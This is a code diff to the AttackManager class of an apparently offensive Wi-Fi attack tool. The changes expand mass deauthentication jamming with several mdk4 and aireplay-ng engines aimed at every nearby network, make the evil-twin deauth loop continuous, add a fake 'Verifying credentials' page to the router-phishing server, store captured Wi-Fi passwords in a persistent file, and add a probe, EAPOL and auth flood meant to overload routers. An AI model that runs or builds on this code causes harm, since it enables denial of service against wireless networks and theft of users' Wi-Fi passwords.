@@ -292,6 +292,7 @@ class AttackManager:
         label = "STEALTH MASS" if stealth else "PHANTOM MASS"
         print(f"\033[1;31m[💥] {label} DEAUTH: {len(target_nets)} targets  |  ch: {ch_str}\033[0m")
 
+        # ENGINE 1: MDK4 global deauth
         mdk4_cmd = f"mdk4 {mon} d"
         if skip_bssids:
             mdk4_cmd += f" -b {bl_file}"
@@ -305,8 +306,18 @@ class AttackManager:
             self.attack_processes.append(p)
             self.core.add_attack_process(p)
 
-        # Per-target aireplay threads (top 8 by signal)
-        for net in target_nets[:8]:
+        if not stealth:
+            # ENGINE 2: second MDK4 instance for redundancy (no channel filter = all channels)
+            p2 = self.core.run_command(
+                f"mdk4 {mon} d" + (f" -b {bl_file}" if skip_bssids else ""),
+                background=True
+            )
+            if p2:
+                self.attack_processes.append(p2)
+                self.core.add_attack_process(p2)
+
+        # ENGINE 3: per-target aireplay threads — ALL targets, no cap
+        for net in target_nets:
             threading.Thread(
                 target=self._continuous_deauth_thread,
                 args=(net, stealth), daemon=True
@@ -363,15 +374,28 @@ class AttackManager:
 
         self.core.set_current_operation("FULL_JAMMING")
         self.attack_running = True
+        mon = self.core.mon_interface
 
-        print(f"\033[1;31m[💥] Full-spectrum jamming: ch {ch_str}\033[0m")
-        p = self.core.run_command(
-            f"mdk4 {self.core.mon_interface} d -c {ch_str}",
-            background=True
-        )
-        if p:
-            self.attack_processes.append(p)
-            self.core.add_attack_process(p)
+        print(f"\033[1;31m[💥] Full-spectrum jamming: ch {ch_str} — {count} targets\033[0m")
+
+        # ENGINE 1: MDK4 deauth with channel list
+        p1 = self.core.run_command(f"mdk4 {mon} d -c {ch_str}", background=True)
+        if p1:
+            self.attack_processes.append(p1)
+            self.core.add_attack_process(p1)
+
+        # ENGINE 2: MDK4 second instance — no filter, blanket all
+        p2 = self.core.run_command(f"mdk4 {mon} d", background=True)
+        if p2:
+            self.attack_processes.append(p2)
+            self.core.add_attack_process(p2)
+
+        # ENGINE 3: per-target aireplay continuous deauth on every found network
+        for net in self.scanner.networks.values():
+            threading.Thread(
+                target=self._continuous_deauth_thread,
+                args=(net, False), daemon=True
+            ).start()
 
         threading.Thread(
             target=self._anim_mass, args=(count, False), daemon=True
@@ -582,11 +606,26 @@ class AttackManager:
             self.core.clear_current_operation()
 
     def _deauth_real_ap_loop(self, target):
+        """Keep real AP clients disconnected — dual engine: aireplay + MDK4."""
+        bssid   = target['bssid']
+        channel = self._safe_channel(target)
+        mon     = self.core.mon_interface
+
+        # Launch MDK4 continuous deauth in background
+        mdk4_p = self.core.run_command(
+            f"mdk4 {mon} d -B {bssid} -c {channel}",
+            background=True
+        )
+        if mdk4_p:
+            self.attack_processes.append(mdk4_p)
+            self.core.add_attack_process(mdk4_p)
+
+        # Aireplay loop — continuous broadcast deauth
         while self.evil_twin_running:
             self.core.run_command(
-                f"aireplay-ng --deauth 15 -a {target['bssid']} {self.core.mon_interface} > /dev/null 2>&1"
+                f"aireplay-ng --deauth 0 -a {bssid} {mon} > /dev/null 2>&1 &"
             )
-            time.sleep(2)
+            time.sleep(3)
 
     def _run_phishing_server(self, target):
         brand = self.router_brand
@@ -731,11 +770,37 @@ class AttackManager:
 
         page_html = PAGES.get(brand, GENERIC)
 
+        connecting_page = (
+            "<html><head><title>Connecting...</title>"
+            "<meta http-equiv='refresh' content='8;url=/'>"
+            "<style>"
+            "body{background:#f5f5f5;font-family:Arial,sans-serif;text-align:center;padding:80px;margin:0}"
+            ".spinner{display:inline-block;width:48px;height:48px;border:5px solid #ccc;"
+            "border-top-color:#4A90E2;border-radius:50%;animation:spin 1s linear infinite}"
+            "@keyframes spin{to{transform:rotate(360deg)}}"
+            "h2{color:#333;margin-bottom:10px}p{color:#777}"
+            "</style></head><body>"
+            f"<h2>Connecting to {essid}...</h2>"
+            "<div class='spinner'></div>"
+            "<p style='margin-top:20px'>Verifying credentials, please wait...</p>"
+            "</body></html>"
+        )
+
         class Handler(http.server.BaseHTTPRequestHandler):
             def log_message(self, fmt, *args):
                 pass
 
             def do_GET(self):
+                if self.path == '/favicon.ico':
+                    self.send_response(404)
+                    self.end_headers()
+                    return
+                if self.path.startswith('/connecting'):
+                    self.send_response(200)
+                    self.send_header("Content-Type", "text/html; charset=utf-8")
+                    self.end_headers()
+                    self.wfile.write(connecting_page.encode("utf-8"))
+                    return
                 self.send_response(200)
                 self.send_header("Content-Type", "text/html; charset=utf-8")
                 self.end_headers()
@@ -809,20 +874,91 @@ class AttackManager:
         self.core.run_command("systemctl start NetworkManager 2>/dev/null")
 
     def _save_creds(self, target, password):
+        line = (
+            f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]"
+            f"  SSID: {target['essid']}"
+            f"  |  BSSID: {target['bssid']}"
+            f"  |  Password: {password}\n"
+        )
+        # Save to temp (volatile) — always
         try:
             with open("/tmp/ns_cracked.txt", "a") as f:
-                f.write(
-                    f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]"
-                    f"  SSID: {target['essid']}"
-                    f"  |  BSSID: {target['bssid']}"
-                    f"  |  Password: {password}\n"
-                )
-            print("\033[1;32m[💾] Saved to /tmp/ns_cracked.txt\033[0m")
+                f.write(line)
         except Exception:
             pass
+        # Save to session dir (persistent across reboots)
+        try:
+            import os as _os
+            session_dir = _os.path.expanduser("~/netstrike")
+            _os.makedirs(session_dir, exist_ok=True)
+            session_file = _os.path.join(session_dir, "cracked.txt")
+            with open(session_file, "a") as f:
+                f.write(line)
+            print(f"\033[1;32m[💾] Saved → {session_file}\033[0m")
+        except Exception:
+            print("\033[1;32m[💾] Saved to /tmp/ns_cracked.txt\033[0m")
 
     # ═══════════════════════════════════════════════
-    # 8. BEACON FLOOD
+    # 8. PROBE + EAPOL FLOOD
+    # ═══════════════════════════════════════════════
+
+    def probe_eapol_flood(self):
+        """
+        MDK4 probe request flood + EAPOL flood simultaneously.
+        Overwhelms AP management frame processing — causes high CPU/memory on router.
+        """
+        if not self.scanner.wifi_scan(10):
+            return
+        self.scanner.display_scan_results()
+        target = self.scanner.select_target()
+        if not target:
+            return
+
+        bssid   = target['bssid']
+        channel = self._safe_channel(target)
+        essid   = target['essid']
+        mon     = self.core.mon_interface
+
+        self.core.run_command(f"iwconfig {mon} channel {channel} 2>/dev/null")
+        self.core.set_current_operation("PROBE_EAPOL_FLOOD")
+        self.attack_running = True
+
+        print(f"\033[1;31m[💣] PROBE + EAPOL FLOOD: {essid}\033[0m")
+
+        # EAPOL flood — exhausts AP authentication state machine
+        p1 = self.core.run_command(
+            f"mdk4 {mon} x -t {bssid} -n '{essid}'",
+            background=True
+        )
+        # Probe request flood — floods management queue
+        p2 = self.core.run_command(
+            f"mdk4 {mon} p -b {bssid} -c {channel}",
+            background=True
+        )
+        # Auth flood — fills association table
+        p3 = self.core.run_command(
+            f"mdk4 {mon} a -a {bssid} -m",
+            background=True
+        )
+
+        for p in [p1, p2, p3]:
+            if p:
+                self.attack_processes.append(p)
+                self.core.add_attack_process(p)
+
+        print("\033[1;31m[🔥] EAPOL flood: ACTIVE\033[0m")
+        print("\033[1;31m[🔥] Probe flood: ACTIVE\033[0m")
+        print("\033[1;31m[🔥] Auth flood:  ACTIVE\033[0m")
+
+        threading.Thread(target=self._anim_stress, daemon=True).start()
+        print("\033[1;33m[⏹] Press Enter to stop...\033[0m")
+        input()
+        self.stop_attacks()
+        self.core.clear_current_operation()
+        print("\033[1;32m[✓] Flood terminated\033[0m")
+
+    # ═══════════════════════════════════════════════
+    # 9. BEACON FLOOD
     # ═══════════════════════════════════════════════
 
     def beacon_flood(self):
